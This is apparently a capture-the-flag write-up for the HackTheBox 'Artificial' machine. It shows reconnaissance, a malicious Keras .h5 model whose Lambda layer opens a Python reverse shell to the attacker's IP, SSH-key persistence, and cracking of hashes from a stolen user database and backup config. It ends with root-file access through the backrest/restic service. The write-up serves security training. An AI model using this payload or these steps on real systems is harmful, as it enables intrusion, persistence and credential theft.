---
layout: post
title: "week 6 artificial"
date: 2025-06-27 00:00:00 -0700
categories: challenges
description: This challenge was pretty simple. Read some tensorflow documentation to understand how to load an arbitrary lambda into a model, upload it to be ran by our target - then elevate permissions through a secondary backup service running on the server.
parent: HackTheBox - Season 8
grand_parent: Challenges
event: "htb-season-8"
tags:
- "web"
- "linux"
- "easy"
- "backups"
- "python"
---
# week6-artificial

## Engagement Notes

This challenge was pretty simple. Read some tensorflow documentation to understand how to load an arbitrary lambda into a model, upload it to be ran by our target - then elevate permissions through a secondary backup service running on the server.

# Enumeration

### Set variables for further engagement


```python
import requests
from chepy import Chepy
from pprint import pprint

source =! ip address | grep tun | grep 10 | tr "/" " " | awk '{print $2}'
public_source = requests.get('https://ifconfig.co/ip').text
target = 'artificial.htb'

print(f"source: {source}")
print(f"target: {target}")
```

    source: ['10.10.14.31']
    target: artificial.htb


### Port scan target


```python
!rustscan --no-banner -a $target
```

    [~] File limit higher than batch size. Can increase speed by increasing batch size '-b 524188'.
    Open 10.129.37.64:22
    Open 10.129.37.64:80
    [~] Starting Script(s)
    [~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-21 12:03 PDT
    Initiating Ping Scan at 12:03
    Scanning 10.129.37.64 [2 ports]
    Completed Ping Scan at 12:03, 0.09s elapsed (1 total hosts)
    Initiating Parallel DNS resolution of 1 host. at 12:03
    Completed Parallel DNS resolution of 1 host. at 12:03, 0.00s elapsed
    DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 3, TR: 3, CN: 0]
    Initiating Connect Scan at 12:03
    Scanning 10.129.37.64 [2 ports]
    Discovered open port 80/tcp on 10.129.37.64
    Discovered open port 22/tcp on 10.129.37.64
    Completed Connect Scan at 12:03, 0.10s elapsed (2 total ports)
    Nmap scan report for 10.129.37.64
    Host is up, received conn-refused (0.095s latency).
    Scanned at 2025-06-21 12:03:25 PDT for 0s
    
    PORT   STATE SERVICE REASON
    22/tcp open  ssh     syn-ack
    80/tcp open  http    syn-ack
    
    Read data files from: /nix/store/l2nxy529ym7d4a2shyhspvjqhhj11q09-nmap-7.95/bin/../share/nmap
    Nmap done: 1 IP address (1 host up) scanned in 0.23 seconds
    


### URL scan target


```python
!gobuster dir -u http://$target -w $(wordlists_path)/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -x txt,js,html,php -t 40 --timeout=6s -o gobuster-task.txt --retry
```

    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://artificial.htb
    [+] Method:                  GET
    [+] Threads:                 40
    [+] Wordlist:                /nix/store/khjvbjjz3yazpgln3qb9nykyf4ypahcm-wordlists-collection/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Extensions:              php,txt,js,html
    [+] Timeout:                 6s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /login               0 (0.07%) (Status: 200) [Size: 857]
    /register             (Status: 200) [Size: 952]
    /logout              20 (1.38%) (Status: 302) [Size: 189] [--> /]
    /dashboard           220 (3.31%) (Status: 302) [Size: 199] [--> /login]
    Progress: 98027 / 408220 (24.01%)^C
    
    [!] Keyboard interrupt detected, terminating.
    Progress: 98158 / 408220 (24.05%)
    ===============================================================
    Finished
    ===============================================================


We find a pretty limited footprint of just a free-to-register web portal with a helpful Dockerfile to generate payloads to upload. Very thoughtful of them!

## Foothold

![alt text](engagement_files/image.png)

Rather than worry about versioning, I just use their Dockerfile. While friends worked on this as well we realized that subtle python version differences were causing huge differences in the payload behavior. Ultimately they also ended up using Docker to solve this problem.


```python
!wget2 http://artificial.htb/static/Dockerfile
```

    
    
    7[Files: 0  Bytes: 0  [0 B/s] Re]87[http://artificial.htb/static/D]87Saving 'Dockerfile'
    87Dockerfile           100% [=============================>]     457     --.-KB/s87HTTP response 200 OK [http://artificial.htb/static/Dockerfile]
    87Dockerfile           100% [=============================>]     457     --.-KB/s87[Files: 1  Bytes: 457  [2.41KB/]8


```python
!cat Dockerfile
```

    FROM python:3.8-slim
    
    WORKDIR /code
    
    RUN apt-get update && \
        apt-get install -y curl && \
        curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
        rm -rf /var/lib/apt/lists/*
    
    RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl
    
    ENTRYPOINT ["/bin/bash"]



```python
!docker build -q -t artificial .
```

    sha256:d80d4a43ae7808e4dca6c7976f9a00c9cffd54807d71b564b0f894b1df780bb8



```python
!echo 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.31",9999));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")' > tensorshell.py
```

This uploaded fine but did not pop a shell. Uploads recommended .h5 format so we'll have to continue with [this Lambda injection methodology I found](https://www.kb.cert.org/vuls/id/253266)


```python
!cat tensorshell.py
```

    import tensorflow as tf
    from tensorflow.keras.layers import Input, Lambda
    from tensorflow.keras.models import Model
    
    def harmless_lambda(x):
        import os,pty,socket;s=socket.socket();s.connect(("10.10.14.31",9999));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")
    
    inputs = Input(shape=(1,))
    outputs = Lambda(harmless_lambda)(inputs)
    model = Model(inputs, outputs)
    
    # Save the model as HDF5 with a Lambda layer
    model.save("test_lambda_layer.h5")
    print("Model with Lambda layer saved as test_lambda_layer.h5")


With the container built and the source code ready, lets put it all together:

```sh
 docker run --rm -it -v $(pwd):/source artificial     
root@981134245a0b:/code# ls
tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl
root@981134245a0b:/code# cd /source
root@981134245a0b:/source# ls
Dockerfile  engagement.ipynb  engagement_files  gobuster-task.txt  requirements.txt  requirements.txt.1  site  solve.py  tensorshell.py
root@981134245a0b:/source# python tensorshell.py 
2025-06-21 19:30:59.184751: I tensorflow/core/platform/cpu_feature_guard.cc:182] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.
To enable the following instructions: AVX2 FMA, in other operations, rebuild TensorFlow with the appropriate compiler flags.
root@981134245a0b:/source# exit
exit
 ls
... 
test_lambda_layer.h5
```

During the build, I did have to have the port open here to allow the method to execute once. However, once I re-opened the port and submitted my .h5 file, we get the following shell.

Here I ran through commands pretty quickly because it kept booting me off, the model run must have a really short timeout.

To get persistence and save my sanity, I abused the fact that this had a spawnable shell and just added some public keys to the box.

```sh
 nc -lvn 9999
Listening on 0.0.0.0 9999
Connection received on 10.129.37.64 36846
app@artificial:~/app$ mkdir ~/.ssh
mkdir ~/.ssh
app@artificial:~/app$ echo "ssh-ed25519 AAAAC3Nza...UVdKr58BTNzZv" >> ~/.ssh/authorized_keys
<Z5e4pnFq2mNUVdKr58BTNzZv" >> ~/.ssh/authorized_keys
```
```sh
 ssh app@artificial.htb    
The authenticity of host 'artificial.htb (10.129.37.64)' can't be established.
ED25519 key fingerprint is SHA256:RfqGfdDw0WXbAPIqwri7LU4OspmhEFYPijXhBj6ceHs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'artificial.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat 21 Jun 2025 07:46:34 PM UTC

  System load:           0.09
  Usage of /:            62.3% of 7.53GB
  Memory usage:          30%
  Swap usage:            0%
  Processes:             231
  Users logged in:       0
  IPv4 address for eth0: 10.129.37.64
  IPv6 address for eth0: dead:beef::250:56ff:feb0:9e67


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sat Jun 21 19:46:35 2025 from 10.10.14.31
app@artificial:~$ 
```
I spent some time here trying to forge JWTs with the littered jwt-secrets, to no avail.

It was useful to open a port forwarded socket to the backend service I identified on 9098 to see what it was:
```sh
$ netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9898          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -   
```
This will make the remote server's :9898 service available from my interfaces :9898
```sh
 ssh app@artificial.htb -L 9898:localhost:9898
```


```python
!curl -X POST 'localhost:9898/v1.Backrest/GetOperations' --data '{}' -H 'Content-Type: application/json'
```

    Unauthorized (No Authorization Header)


Went back for the main applications user database, there might be something useful here.

```sh
 scp app@artificial.htb:/home/app/app/instance/
users.db .
users.db 
```

Throwing these into crackstation we get a couple new passwords.

```sh
sqlite> select * from user
   ...> ;
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
6|tokugero|toku@gero.com|45300156cdf1f89d89659b5dd111adca
7|{{ 1+1 }}|tokugero@gero.com|45300156cdf1f89d89659b5dd111adca
```
https://crackstation.net/
```log
bf041041e57f1aff3be7ea1abd6129d0	Unknown	Not found.
bc25b1f80f544c0ab451c02a3dca9fc6	md5	marwinnarak043414036
b606c5f5136170f15444251665638b36	Unknown	Not found.
0f3d8c76530022670f1c6029eed09ccb	Unknown	Not found.
c99175974b6e192936d97224638a34f8	md5	mattp005numbertwo
```

```
mark:marwinnarak043414036
mary:mattp005numbertwo
```

Trying ssh for `gael` with one of the passwords (`mattp005numbertwo`) lets us in.

## Elevation

Doing some more research on the :9898 service, as this seems like an organic progression, we find the following repo:  
[backrest github](https://github.com/garethgeorge/backrest)  

Looking around the system we see this backrest_backup.tar.gz is group readable by sysadm. If we check `/etc/group` we can see that `gael` is a member of this group. Lets steal it!
```sh
gael@artificial:~$ cp /var/backups/backrest_backup.tar.gz .
gael@artificial:~$ ls
backrest_backup.tar.gz  linpeas.sh  user.txt
gael@artificial:~$ tar -xvf backrest_backup.tar.gz 
backrest/
backrest/restic
backrest/oplog.sqlite-wal
backrest/oplog.sqlite-shm
backrest/.config/
backrest/.config/backrest/
backrest/.config/backrest/config.json
backrest/oplog.sqlite.lock
backrest/backrest
backrest/tasklogs/
backrest/tasklogs/logs.sqlite-shm
backrest/tasklogs/.inprogress/
backrest/tasklogs/logs.sqlite-wal
backrest/tasklogs/logs.sqlite
backrest/oplog.sqlite
backrest/jwt-secret
backrest/processlogs/
backrest/processlogs/backrest.log
backrest/install.sh
gael@artificial:~$ cd backrest/
gael@artificial:~/backrest$ 
```
In the `.config` directory we find a user and password for this service:

```sh
/backrest/.config/backrest   main  cat config.json 
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```

Base64 decoding it presents `$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO`

Hashcat was taking *forever* with this hash. I tried it with jtr instead and it found it immediately. It's likely the password hash type I picked out of the lineup for hashcat was incorrect. This worked well enough though.

```sh
[nix-shell:~/tmp]$ john --wordlist=/nix/store/khjvbjjz3yazpgln3qb9nykyf4ypahcm-wordlists-collection/share/wordlists/rock
you.txt backrest_root.hash    
Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
Use the "--format=bcrypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 32 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
!@#$%^           (?)     
1g 0:00:00:05 DONE (2025-06-21 15:42) 0.1961g/s 1072p/s 1072c/s 1072C/s caleb1..ilovedanny
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Logging into the :9898 interface with our new password for `backrest_root:!@#$%^` we get access to create a repo and create a task.

Based on the documentation, the repo is the snapshot path references, and the task lets us pick a folder on the system that the executing user (root) can access.

So we specify the path as wherever, the task as the directory /root, and do an immediate run of the task.

Now we can run an arbitrary command that's part of the restic suite. This one let me mount the snapshot of /root into /home/gael/restore and strip all permissions letting us get to the root.txt

Pardon the iteration and typos:
```sh
mount /home/gael/restr3 --allow-other --no-default-permissions
```

With that command executed through the web portal, we can now browse to it on the system:
```sh
gael@artificial:~$ cd restre3/snapshots/latest/root/
gael@artificial:~/restre3/snapshots/latest/root$ ls
config  data  index  keys  locks  root.txt  scripts  snapshots
gael@artificial:~/restre3/snapshots/latest/root$ cat root.txt
01b3836583c05a310a3ed9dadb34bc25
```

I wasn't able to log into root, but I bet I could get clever to restore an authorized_keys to /root/.ssh/ and restore a modified /etc/ssh/sshd_config with `permit root login` if I wanted to get full access to the system. But after last week's insane challenge I think I'll leave that exercise to the reader.

Afterwards my buddy found that the hooks endpoints allowed for straight command execution on triggers, that was a much more intuitive idea that did pop a shell.